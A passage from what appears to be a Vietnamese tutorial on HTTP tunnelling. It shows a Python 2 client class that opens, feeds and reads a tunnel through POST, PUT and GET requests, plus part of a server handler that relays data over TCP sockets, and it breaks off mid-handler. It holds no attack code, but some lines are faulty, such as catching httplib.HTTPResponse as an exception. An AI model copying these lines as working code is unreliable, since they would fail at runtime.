&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Connection&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;connection_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;remote_addr&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;connection_id&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;http_conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;httplib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTPConnection&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;remote_addr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;host&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;remote_addr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;port&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;target_addr&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;params&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlencode&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;host&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;target_addr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;host&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;target_addr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;port&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]})&lt;/span&gt;
        &lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content-Type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;application/x-www-form-urlencoded&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Accept&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;text/plain&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;

        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;http_conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;http_conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getresponse&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Successfully create connection&amp;#39;&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Fail to establish connection: status &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt; because &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
                &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reason&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;params&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlencode&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
        &lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content-Type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;application/x-www-form-urlencoded&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Accept&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;text/plain&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;http_conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PUT&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;http_conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getresponse&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;
        &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;httplib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTPResponse&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;ex&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Error Sending Data: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;ex&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;receive&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;http_conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;http_conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getresponse&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;
            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET HTTP Status: &lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;httplib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTPResponse&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;ex&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Error Receiving Data: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;ex&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;

    &lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Như bạn thấy ở đây, &lt;tt class="docutils literal"&gt;Connection&lt;/tt&gt; có những hàm để thiết lập đường hầm, gửi và nhận dữ liệu. Sự tưong tác này được xây dựng trên giao thức HTTP. Cụ thể là:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;POST request: yêu cầu thiết lập kết nối.&lt;/li&gt;
&lt;li&gt;PUT request: gửi dữ liệu qua kết nối.&lt;/li&gt;
&lt;li&gt;GET request: nhận kết nối.&lt;/li&gt;
&lt;li&gt;DELETE request: kết thúc kết nối.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Sẽ rõ ràng hơn khi ta nhìn vào mã của &lt;tt class="docutils literal"&gt;tunneld.py&lt;/tt&gt;, thành phần nhận những yêu cầu HTTP này:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ProxyRequestHandler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BaseHTTPRequestHandler&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;

    &lt;span class="n"&gt;BUFFER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1024&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_get_connection_id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;do_GET&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;GET: Read data from TargetAddress and return to client through http response&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_get_socket&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;BUFFER&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;
                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;end_headers&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;wfile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;...&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;do_POST&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;POST: Create TCP Connection to the TargetAddress&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_get_connection_id&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

        &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getheader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;content-length&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="n"&gt;req_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rfile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;params&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cgi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parse_qs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;keep_blank_values&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;target_host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;host&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;target_port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;port&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Connecting to target address: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt; &lt;/span&gt;&lt;span class="si"&gt;% s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target_host&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;target_port&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="c1"&gt;#open socket connection to remote server&lt;/span&gt;
        &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;target_host&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;target_port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;settimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Successfully connected&amp;#39;&lt;/span&gt;
        &lt;span class="c1"&gt;#save socket reference&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sockets&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;end_headers&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;do_PUT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Read data from HTTP Request and send to TargetAddress&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_get_connection_id&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sockets&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
